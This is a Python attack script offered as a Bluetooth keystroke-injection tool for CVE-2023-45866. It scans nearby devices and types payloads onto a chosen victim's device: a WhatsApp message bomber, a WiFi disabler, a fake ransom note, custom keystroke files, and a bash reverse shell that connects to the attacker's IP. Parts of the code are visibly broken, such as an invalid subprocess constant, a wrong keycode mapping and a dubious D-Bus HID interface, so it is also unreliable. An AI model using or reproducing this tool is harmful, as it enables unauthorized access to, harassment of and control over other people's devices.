#!/usr/bin/env python3
import os
import sys
import time
import dbus
import pexpect
import shutil
import random
import string
import subprocess
from threading import Thread

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
RESET = "\033[0m"

print(f"""{GREEN}
███████╗██████╗░██╗░█████╗░██████╗░██████╗░
██╔════╝██╔══██╗██║██╔══██╗██╔══██╗╚════██╗
█████╗░░██║░░██║██║██║░░██║██████╔╝░█████╔╝
██╔══╝░░██║░░██║██║██║░░██║██╔═══╝░░╚═══██╗
███████╗██████╔╝██║╚█████╔╝██║░░░░░██████╔╝
╚══════╝╚═════╝░╚═╝░╚════╝░╚═╝░░░░░╚═════╝░

██████╗░██╗░░░░░██╗░░░██╗███████╗
██╔══██╗██║░░░░░██║░░░██║██╔════╝
██████╦╝██║░░░░░██║░░░██║█████╗░░
██╔══██╗██║░░░░░██║░░░██║██╔══╝░░
██████╦╝███████╗╚██████╔╝███████╗
╚═════╝░╚══════╝░╚═════╝░╚══════╝
{RESET}""")

print(f"{RED}ediop3Squad got you. Turn off ur Bluetooth vro{RESET}")
print(f"{YELLOW}Target must be vulnerable to CVE-2023-45866{RESET}\n")

def generate_mac():
    return ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])

def check_root():
    if os.geteuid() != 0:
        print(f"{RED}Run as root!{RESET}")
        sys.exit(1)

def check_bluetooth_service():
    try:
        bus = dbus.SystemBus()
        manager = dbus.Interface(bus.get_object('org.bluez', '/'), 'org.freedesktop.DBus.ObjectManager')
        return True
    except:
        print(f"{RED}Bluetooth service not running!{RESET}")
        return False

def check_vulnerability(mac):
    print(f"{YELLOW}Testing {mac}...{RESET}")
    try:
        child = pexpect.spawn(f"bluetoothctl info {mac}")
        child.expect(["Device", pexpect.EOF, pexpect.TIMEOUT], timeout=10)
        return "Device" in child.before.decode()
    except:
        return False

def scan_devices():
    print(f"{YELLOW}Scanning...{RESET}")
    if not shutil.which("bluetoothctl"):
        print(f"{RED}Install bluetoothctl{RESET}")
        sys.exit(1)
    
    try:
        scan_proc = subprocess.Popen(["bluetoothctl", "scan", "on"], stdout=subprocess.PEV, stderr=subprocess.PIPE)
        time.sleep(12)
        scan_proc.terminate()
        
        devices_proc = subprocess.run(["bluetoothctl", "devices"], capture_output=True, text=True)
        devices = []
        for i, line in enumerate(devices_proc.stdout.splitlines(), 1):
            if "Device" in line:
                mac = line.split()[1]
                devices.append(mac)
                print(f"{GREEN}[{i}] {mac}{RESET}")
        return devices
    except:
        print(f"{RED}Scan failed{RESET}")
        sys.exit(1)

def get_target_mac():
    mac = input(f"{BLUE}Enter target MAC (leave blank to scan): {RESET}").strip()
    if not mac:
        devices = scan_devices()
        if not devices:
            print(f"{RED}No devices found{RESET}")
            sys.exit(1)
        choice = input(f"{BLUE}Select device (1-{len(devices)}): {RESET}").strip()
        if not choice.isdigit() or int(choice) < 1 or int(choice) > len(devices):
            print(f"{RED}Invalid selection{RESET}")
            sys.exit(1)
        mac = devices[int(choice)-1]
    return mac

def send_hid_report(mac, report):
    try:
        bus = dbus.SystemBus()
        device_path = f"/org/bluez/hci0/dev_{mac.replace(':', '_')}"
        device = bus.get_object("org.bluez", device_path)
        device_iface = dbus.Interface(device, "org.bluez.Device1")
        
        if not device_iface.get("Connected", dbus_interface="org.freedesktop.DBus.Properties"):
            device_iface.Connect()
            time.sleep(1)
            
        report_iface = dbus.Interface(device, "org.bluez.HID1")
        report_iface.SendReport(dbus.Array(report, signature="y"))
    except:
        print(f"{RED}Failed to send HID report{RESET}")

def send_keystrokes(mac, payload):
    try:
        if payload == "whatsapp_bomb":
            number = input(f"{BLUE}Enter phone number (+countrycode): {RESET}").strip()
            if not number.startswith("+"):
                print(f"{RED}Invalid number format{RESET}")
                return
                
            keys = [
                0xA1,0x01,0x00,0x00,0x29,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x2B,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x2B,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x2B,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x2B,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x15,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x0F,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x0F,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x2C,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x1A,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x0E,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00,
            ]
            send_hid_report(mac, keys)
            time.sleep(3)
            
            for char in f"https://wa.me/{number}":
                hex_val = ord(char.lower()) - 93
                send_hid_report(mac, [0xA1,0x01,0x00,0x00,hex_val,0x00,0x00,0x00,0x00,0x00])
                time.sleep(0.1)
                
            send_hid_report(mac, [0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00])
            time.sleep(5)
            
            for _ in range(5):
                send_hid_report(mac, [0xA1,0x01,0x00,0x00,0x2B,0x00,0x00,0x00,0x00,0x00])
                time.sleep(0.3)
                
            send_hid_report(mac, [0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00])
            time.sleep(7)
            
            for msg in ["ediop3Squad got you","Turn off Bluetooth","Good luck =)"]:
                for char in msg:
                    hex_val = ord(char.lower()) - 93
                    send_hid_report(mac, [0xA1,0x01,0x00,0x00,hex_val,0x00,0x00,0x00,0x00,0x00])
                    time.sleep(0.1)
                send_hid_report(mac, [0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00])
                time.sleep(2)
                send_hid_report(mac, [0xA1,0x01,0x00,0x00,0x2B,0x00,0x00,0x00,0x00,0x00])
                time.sleep(0.3)
                send_hid_report(mac, [0xA1,0x01,0x00,0x00,0x2B,0x00,0x00,0x00,0x00,0x00])
                time.sleep(0.3)
                send_hid_report(mac, [0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00])
                time.sleep(2)

        elif payload == "wifi_killer":
            keys = [
                0xA1,0x01,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x1A,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00,
            ]
            send_hid_report(mac, keys)

        elif payload == "rickroll":
            keys = [
                0xA1,0x01,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x1A,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00,
            ]
            send_hid_report(mac, keys)
            time.sleep(2)
            
            for char in "https://youtu.be/dQw4w9WgXcQ":
                hex_val = ord(char.lower()) - 93
                send_hid_report(mac, [0xA1,0x01,0x00,0x00,hex_val,0x00,0x00,0x00,0x00,0x00])
                time.sleep(0.1)
                
            send_hid_report(mac, [0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00])

        elif payload == "reverse_shell":
            ip = input(f"{BLUE}Enter your IP: {RESET}").strip()
            port = input(f"{BLUE}Enter port: {RESET}").strip()
            
            if not all(c.isdigit() or c == '.' for c in ip) or not port.isdigit():
                print(f"{RED}Invalid IP/port{RESET}")
                return
                
            keys = [
                0xA1,0x01,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x1A,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00,
            ]
            send_hid_report(mac, keys)
            time.sleep(2)
            
            for char in f"bash -i >& /dev/tcp/{ip}/{port} 0>&1":
                hex_val = ord(char.lower()) - 93
                send_hid_report(mac, [0xA1,0x01,0x00,0x00,hex_val,0x00,0x00,0x00,0x00,0x00])
                time.sleep(0.1)
                
            send_hid_report(mac, [0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00])

        elif payload == "ransom_note":
            keys = [
                0xA1,0x01,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x1A,0x00,0x00,0x00,0x00,0x00,
                0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00,
            ]
            send_hid_report(mac, keys)
            time.sleep(2)
            
            for char in "echo 'Your files are encrypted! Pay $1000 in BTC to get them back.' > ransom.txt":
                hex_val = ord(char.lower()) - 93
                send_hid_report(mac, [0xA1,0x01,0x00,0x00,hex_val,0x00,0x00,0x00,0x00,0x00])
                time.sleep(0.1)
                
            send_hid_report(mac, [0xA1,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00])

        elif payload == "custom":
            filename = input(f"{BLUE}Enter payload file: {RESET}").strip()
            if not os.path.isfile(filename):
                print(f"{RED}File not found{RESET}")
                return
                
            with open(filename) as f:
                for line in f:
                    try:
                        hex_vals = [int(x.strip(), 16) for x in line.split(",")]
                        send_hid_report(mac, hex_vals)
                        time.sleep(0.1)
                    except:
                        continue

    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")

check_root()
if not check_bluetooth_service():
    sys.exit(1)

mac = get_target_mac()

if not check_vulnerability(mac):
    print(f"{RED}Target not vulnerable{RESET}")
    sys.exit(1)

print(f"""{PURPLE}
1. whatsapp_bomb   - WhatsApp message bomber
2. wifi_killer     - Disable WiFi
3. rickroll        - Rickroll target
4. reverse_shell   - Open reverse shell
5. ransom_note     - Create ransom note
6. custom         - Load custom payload
{CYAN}""")

payload = input("Select payload: ").strip()
if payload not in ["whatsapp_bomb", "wifi_killer", "rickroll", "reverse_shell", "ransom_note", "custom"]:
    print(f"{RED}Invalid payload{RESET}")
    sys.exit(1)

send_keystrokes(mac, payload)
